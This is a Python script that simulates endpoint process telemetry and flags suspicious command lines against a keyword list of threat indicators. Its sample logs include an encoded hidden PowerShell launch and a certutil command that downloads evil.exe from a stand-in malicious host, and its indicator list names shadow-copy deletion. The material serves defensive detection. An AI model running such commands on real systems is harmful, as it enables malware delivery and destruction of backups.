import time

# Simulated endpoint process telemetry (Process ID, Parent Process, Command Line, User)
ENDPOINT_PROCESS_LOGS = [
    {"pid": 1044, "parent": "explorer.exe", "cmd": "C:\\Windows\\System32\\notepad.exe readme.txt", "user": "alice"},
    {"pid": 2208, "parent": "services.exe", "cmd": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "user": "SYSTEM"},
    # Suspicious Living-off-the-Land binary / encoded PowerShell execution
    {"pid": 3102, "parent": "winword.exe", "cmd": "powershell.exe -nop -w hidden -enc JABhAGwAbABvAHcA...", "user": "alice"},
    # Suspicious direct IP download and execution
    {"pid": 4110, "parent": "cmd.exe", "cmd": "certutil.exe -urlcache -split -f http://malicious-drop.com/evil.exe C:\\Temp\\evil.exe", "user": "bob"},
    {"pid": 1550, "parent": "explorer.exe", "cmd": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "user": "alice"}
]

# High-risk execution indicators for endpoints
ENDPOINT_THREAT_INDICATORS = [
    "-enc ",
    "-w hidden",
    "certutil.exe -urlcache",
    "vssadmin delete shadows",
    "powershell -e"
]

def analyze_endpoints():
    print("[*] Initializing Endpoint Security & Process Anomaly Detector...\n")
    print(f"[*] Total active processes ingested for behavioral analysis: {len(ENDPOINT_PROCESS_LOGS)}")
    print("=" * 70)
    
    threats_detected = 0
    
    for proc in ENDPOINT_PROCESS_LOGS:
        pid = proc["pid"]
        parent = proc["parent"]
        cmd = proc["cmd"]
        user = proc["user"]
        
        print(f"[*] PID: {pid} | Parent: {parent} | User: {user}")
        print(f"    Cmdline: {cmd}")
        
        is_threat = False
        matched_flag = ""
        
        for indicator in ENDPOINT_THREAT_INDICATORS:
            if indicator in cmd:
                is_threat = True
                matched_flag = indicator
                break
                
        if is_threat:
            threats_detected += 1
            print(f"  [!] ENDPOINT ALERT: Malicious behavioral pattern detected!")
            print(f"      Indicator Matched: '{matched_flag}'")
            print(f"      Risk: High severity process injection or payload staging.\n")
        else:
            print(f"  [-] Process behavior normal. Within security baseline.\n")
            
    print("=" * 70)
    print(f"[*] Endpoint Scan Complete. Total host threats flagged: {threats_detected}")
    print("=" * 70)

if __name__ == "__main__":
    analyze_endpoints()
